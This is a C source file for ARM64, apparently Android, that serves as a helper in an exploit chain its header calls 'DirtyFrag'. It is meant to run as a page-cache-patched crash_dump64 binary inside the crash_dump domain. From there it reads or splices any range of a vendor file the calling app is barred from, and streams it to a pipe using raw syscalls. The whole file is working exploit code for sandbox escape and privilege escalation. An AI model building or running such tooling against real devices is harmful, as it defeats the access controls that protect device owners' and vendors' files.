/*
 * dirtyfrag_bridge — vendor-file access for the DirtyFrag chain.
 *
 * The app cannot read vendor_file; this freestanding helper runs in the
 * crash_dump domain when executed as the (page-cache patched) crash_dump64 and
 * serves a range of a target file over fd 1:
 *
 *   argv[1] = file offset (decimal)
 *   argv[2] = file path
 *   argv[3] = "r"  read mode: copy the range to fd 1 (a pipe)
 *             "s"  splice mode: splice the file's pages in the range to fd 1
 *   argv[4] = length in bytes (decimal)
 *
 * One invocation handles the whole module (one pipe holds it), instead of one
 * process per 16-byte block. No libc, no relocations, no allocations.
 */
typedef unsigned long u64;
typedef long i64;

#define AT_FDCWD (-100)
#define O_RDONLY 0
#define SEEK_SET 0
#define SPLICE_F_MOVE 1

static i64 sys1(u64 n, u64 a) {
    register u64 x8 __asm__("x8") = n;
    register u64 x0 __asm__("x0") = a;
    __asm__ volatile("svc #0" : "+r"(x0) : "r"(x8) : "memory");
    return (i64)x0;
}
static i64 sys3(u64 n, u64 a, u64 b, u64 c) {
    register u64 x8 __asm__("x8") = n;
    register u64 x0 __asm__("x0") = a;
    register u64 x1 __asm__("x1") = b;
    register u64 x2 __asm__("x2") = c;
    __asm__ volatile("svc #0" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x8) : "memory");
    return (i64)x0;
}
static i64 sys6(u64 n, u64 a, u64 b, u64 c, u64 d, u64 e, u64 f) {
    register u64 x8 __asm__("x8") = n;
    register u64 x0 __asm__("x0") = a;
    register u64 x1 __asm__("x1") = b;
    register u64 x2 __asm__("x2") = c;
    register u64 x3 __asm__("x3") = d;
    register u64 x4 __asm__("x4") = e;
    register u64 x5 __asm__("x5") = f;
    __asm__ volatile("svc #0" : "+r"(x0)
                     : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5), "r"(x8)
                     : "memory");
    return (i64)x0;
}

#define SYS_openat 56
#define SYS_read 63
#define SYS_write 64
#define SYS_lseek 62
#define SYS_splice 76
#define SYS_exit_group 94

static u64 parse(const char *s) {
    u64 v = 0;
    while (*s >= '0' && *s <= '9') v = v * 10 + (u64)(*s++ - '0');
    return v;
}

static char buf[4096];

void start_c(u64 *sp) {
    i64 argc = (i64)sp[0];
    char **argv = (char **)(sp + 1);
    if (argc < 5) sys1(SYS_exit_group, 1);
    u64 off = parse(argv[1]);
    const char *path = argv[2];
    char mode = argv[3][0];
    u64 len = parse(argv[4]);
    i64 fd = sys3(SYS_openat, (u64)AT_FDCWD, (u64)path, O_RDONLY);
    if (fd < 0) sys1(SYS_exit_group, 1);
    if (mode == 'r') {
        sys3(SYS_lseek, (u64)fd, off, SEEK_SET);
        u64 left = len;
        while (left > 0) {
            u64 chunk = left > sizeof(buf) ? sizeof(buf) : left;
            i64 n = sys3(SYS_read, (u64)fd, (u64)buf, chunk);
            if (n <= 0) sys1(SYS_exit_group, 1);
            i64 w = sys3(SYS_write, 1, (u64)buf, (u64)n);
            if (w != n) sys1(SYS_exit_group, 2);
            left -= (u64)n;
        }
        sys1(SYS_exit_group, 0);
    }
    u64 off64 = off;
    u64 left = len;
    while (left > 0) {
        i64 ret = sys6(SYS_splice, (u64)fd, (u64)&off64, 1, 0, left, SPLICE_F_MOVE);
        if (ret <= 0) sys1(SYS_exit_group, 1);
        left -= (u64)ret;
    }
    sys1(SYS_exit_group, 0);
}

__attribute__((naked)) void _start(void) {
    __asm__ volatile("mov x0, sp\nb start_c\n");
}
